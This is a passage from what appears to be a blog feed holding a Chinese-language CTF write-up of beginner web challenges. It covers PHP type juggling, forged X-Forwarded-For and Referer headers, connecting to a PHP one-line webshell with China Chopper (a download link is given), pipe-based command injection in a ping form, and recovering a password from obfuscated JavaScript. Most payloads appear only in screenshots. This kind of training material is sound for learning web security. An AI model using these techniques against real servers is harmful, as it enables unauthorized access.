-href="https://www.cnblogs.com/beenupper/p/12635779.html">彻底解决php判断a==0为真引发的问题-类型转换</a>》，这里不再赘述。</p>
-<p>知道了转换规则，那么我们就可以构造了，得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717115934924.png" class="" title="image-20200717115934924">
-<h1 id="xff_referer">xff_referer</h1>
-<p>进入后提示如下：</p>
-<p>那么我们就在请求包中通过x-forwarded-for伪造ip</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162612014.png" class="" title="image-20200717162612014">
-<p>注意xff加入的位置，我之前加入到末尾发现页面一直在加载没有响应，我想xff写在请求头中间就好了。</p>
-<p>然后发现提示变化：</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717161539728.png" class="" title="image-20200717161539728">
-<p>那么在伪造referer</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162711288.png" class="" title="image-20200717162711288">
-<p>得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162734141.png" class="" title="image-20200717162734141">
-<h1 id="webshell">webshell</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170244887.png" class="" title="image-20200717170244887">
-<p>php的一句话木马，使用中国菜刀连接，中国菜刀可以从这个<a
-href="https://github.com/raddyfiy/caidao-official-version">地方</a>下载，</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170319974.png" class="" title="image-20200717170319974">
-<p>即可进入服务器</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170345624.png" class="" title="image-20200717170345624">
-<p>获得flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170404876.png" class="" title="image-20200717170404876">
-<p>当然，如果没有工具，那就手动构造请求post包</p>
-<p>一句话木马中的变量是shell，所以我们传的变量就是shell</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170710704.png" class="" title="image-20200717170710704">
-<p>可以看到返回了当前路径的所有文件，看到了flag.txt</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170754480.png" class="" title="image-20200717170754480">
-<p>得到flag</p>
-<h1 id="command_execution">command_execution</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172147730.png" class="" title="image-20200717172147730">
-<p>尝试ping一下本机127.0.0.1</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172220593.png" class="" title="image-20200717172220593">
-<p>可以看到ping的结果返回到了页面，那么尝试命令注入</p>
-<p>命令注入有很多种方法，可以参考这两篇文章：<a
-href="https://blog.csdn.net/u014549283/article/details/81783164">文章1</a>，<a
-href="https://blog.csdn.net/qq_41079177/article/details/88321816?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.compare">文章2</a>，这里不再赘述</p>
-<p>这道题比较简单，没有waf，不需要绕过，我使用 | 进行注入</p>
-<p>command 1 | command 2 只执行command2</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172637290.png" class="" title="image-20200717172637290">
-<p>可以看到执行了ls命令，现在找flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172921373.png" class="" title="image-20200717172921373">
-<p>得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172957802.png" class="" title="image-20200717172957802">
-<h1 id="simple_js">simple_js</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181134028.png" class="" title="image-20200717181134028">
-<p>随便输一个</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181148627.png" class="" title="image-20200717181148627">
-<p>看看源码，调试一下js</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181218694.png" class="" title="image-20200717181218694">
-<p>发现不论输入的密码是什么，最后都会跳到假密码FAUX PASSWORD HAHA</p>
-<p>而真密码是初始的pass_enc</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181342602.png" class="" title="image-20200717181342602">
-<p>那么就把pass的值改为pass_enc，执行一下，注意14行的tab2下标要改成10，因为默认的pass长度为18，而修改后的pass长度为11，所以要修改，否则最后执行的时候p加入的就不是pass的最后一个值了（这个地方坑了我好久）</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181443038.png" class="" title="image-20200717181443038">
-<p>把获取到的字符串加上题目要求的flag格式即可得到flag</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web security</tag>
       </tags>
   </entry>
   <entry>
